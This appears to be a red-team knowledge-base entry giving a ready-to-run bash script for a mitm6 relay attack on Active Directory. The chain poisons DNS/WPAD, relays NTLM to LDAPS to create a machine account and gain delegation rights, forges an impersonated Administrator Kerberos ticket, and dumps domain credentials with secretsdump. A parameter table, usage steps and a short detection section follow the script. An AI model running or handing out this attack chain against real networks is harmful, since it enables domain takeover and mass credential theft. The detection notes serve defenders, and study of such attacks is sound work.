---
id: 1a4bd987-1725-4085-9dff-0d49978d97e2
name: Mitm6 Relay Attack Script
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:05.647219+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - dns-poisoning
  - ntlm-relay
  - rbcd
validated: true
---

# Mitm6 Relay Attack Script

## Code

```bash
git clone https://github.com/fox-it/mitm6.git 
cd /opt/tools/mitm6
pip install .

mitm6 -hw ws02 -d lab.local --ignore-nofqnd
# -d: the domain name that we filter our request on (the attacked domain)
# -i: the interface we have mitm6 listen on for events
# -hw: host whitelist

ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad
ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer
# -ip: the interface you want the relay to run on
# -wh: WPAD host, specifying your wpad file to serve
# -t: the target where you want to relay to

# now granting delegation rights and then do a RBCD
ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator  
export KRB5CCNAME=administrator.ccache  
secretsdump.py -k -no-pass target.lab.local  
```

## Description

This bash script orchestrates the full mitm6 relay attack: installing mitm6, poisoning DNS/WPAD, relaying NTLM to LDAPS for account creation and delegation, obtaining an impersonated Kerberos ticket, and dumping domain credentials. It assumes an AD environment and requires replacement of hardcoded values like IPs, domains, and hostnames.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| ws02 | Host whitelist for poisoning | ws02 (target workstation) |
| lab.local | Target AD domain | lab.local |
| 10.10.10.10 | Attacker IP | 10.10.10.10 |
| dc01.lab.local | Domain controller FQDN | dc01.lab.local |
| attacker-wpad | WPAD hostname served | attacker-wpad |
| target.lab.local | Target for SPN | target.lab.local |
| GENERATED$ | Forged computer account | GENERATED$ |
| Administrator | Impersonated user | Administrator |
| administrator.ccache | Kerberos ticket file | administrator.ccache |

## Usage

Execute the script on a Linux attacker machine positioned on the target network. Run mitm6 in one terminal and relay commands sequentially in another after triggering client auth (e.g., via file share access). Used in red team engagements for AD compromise via relay without direct access.

## Detection

- Anomalous LLMNR/NBT-NS queries or WPAD responses in DNS logs.
- Unexpected computer account creations (e.g., GENERATED$) in AD event logs (Event ID 4741).
- LDAPS connections from unusual sources to DC (port 636).
- Kerberos ticket requests for impersonation (Event ID 4769 with unusual service/principal).
- Process monitoring for mitm6.py or ntlmrelayx.py executions.

## Related

- [[procedures/dns-poisoning-and-credential-dumping-via-mitm6-relay-attack]]
- [[tools/mitm6]]
- [[tools/Impacket]]
